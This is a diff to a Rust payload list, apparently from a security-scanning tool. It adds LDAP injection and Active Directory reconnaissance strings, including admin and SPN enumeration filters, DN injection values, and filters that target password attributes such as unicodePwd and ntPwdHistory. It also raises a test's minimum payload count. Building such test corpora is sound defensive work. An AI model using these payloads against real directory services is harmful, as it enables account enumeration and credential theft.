@@ -107,6 +107,129 @@ pub fn get_payloads() -> Vec<Payload> {
             severity: Severity::Medium,
             tags: vec!["ldap".to_string(), "injection".to_string()],
         },
+        // Active Directory payloads
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(memberOf=CN=Administrators,CN=Builtin,DC=domain,DC=com)".to_string(),
+            description: "AD admin group membership filter".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["ldap".to_string(), "active-directory".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(adminCount=1)".to_string(),
+            description: "AD admin count attribute filter".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "active-directory".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(servicePrincipalName=*)".to_string(),
+            description: "AD SPN enumeration filter".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "active-directory".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=512))".to_string(),
+            description: "AD normal user account filter".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "active-directory".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(msDS-KeyCredentialLink=*)".to_string(),
+            description: "AD key credential link filter".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "active-directory".to_string()],
+        },
+        // Search scope payloads
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(objectClass=*)".to_string(),
+            description: "LDAP all objects search scope".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "search-scope".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(&(objectClass=user)(!(objectClass=computer)))".to_string(),
+            description: "LDAP users-only filter".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "search-scope".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(&(objectClass=computer)(operatingSystem=*Server*))".to_string(),
+            description: "LDAP server computer filter".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "search-scope".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(&(objectClass=group)(cn=*))".to_string(),
+            description: "LDAP all groups filter".to_string(),
+            severity: Severity::Medium,
+            tags: vec!["ldap".to_string(), "search-scope".to_string()],
+        },
+        // DN injection payloads
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "admin,DC=domain,DC=com".to_string(),
+            description: "LDAP DN injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "cn=admin,ou=users,dc=domain,dc=com".to_string(),
+            description: "LDAP full DN injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "*".to_string(),
+            description: "LDAP wildcard DN injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "\\2a".to_string(),
+            description: "LDAP escaped wildcard DN injection".to_string(),
+            severity: Severity::High,
+            tags: vec!["ldap".to_string(), "dn-injection".to_string()],
+        },
+        // Attribute extraction payloads
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(userPassword=*)".to_string(),
+            description: "LDAP password attribute extraction".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(unicodePwd=*)".to_string(),
+            description: "AD unicodePwd attribute extraction".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(ntPwdHistory=*)".to_string(),
+            description: "AD NT password history extraction".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Ldap,
+            payload: "(supplementalCredentials=*)".to_string(),
+            description: "AD supplemental credentials extraction".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["ldap".to_string(), "attribute-extraction".to_string()],
+        },
     ]
 }
 
@@ -206,7 +329,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 10,
+            payloads.len() >= 22,
             "Must have LDAP injection payload coverage, got {}",
             payloads.len()
         );
